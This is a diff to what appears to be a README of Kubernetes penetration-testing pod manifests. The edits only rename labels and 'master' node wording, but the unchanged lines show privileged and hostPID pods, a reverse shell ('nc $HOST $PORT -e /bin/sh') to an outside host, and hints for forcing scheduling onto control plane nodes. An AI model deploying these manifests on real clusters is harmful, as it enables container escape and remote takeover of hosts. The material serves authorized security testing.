@@ -11,7 +11,7 @@ kind: Pod
 metadata:
   name: pod-priv-only
   labels: 
-    app: priv-only
+    app: pentest
 spec:
   containers:
   - name: priv-only
@@ -20,8 +20,8 @@ spec:
     args: [ "while true; do sleep 30; done;" ]
     securityContext:
       privileged: true
-  # Force scheduling of your pod on a master mode by uncommenting the next line and changing the nodeName to that of a master node
-  #nodeName: k8s-master
+  # Force scheduling of your pod on a control plane node by uncommenting the next line and changing the nodeName to that of a control plane node
+  #nodeName: k8s-control-plane-node
   ```
 [pod-priv-only.yaml](pod-priv-only.yaml)
 
@@ -47,7 +47,7 @@ kind: Pod
 metadata:
   name: pod-priv-and-hostpid-revshell
   labels: 
-    app: priv-and-hostpid-revshell
+    app: pentest
 spec:
   hostPID: true
   containers:
@@ -55,11 +55,10 @@ spec:
     image: busybox
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
-
     securityContext:
       privileged: true
-  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
-  #nodeName: k8s-master
+  # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
+  #nodeName: k8s-control-plane-node
   restartPolicy: Always
 ```
 [pod-priv-only-revshell.yaml](pod-priv-only-revshell.yaml)
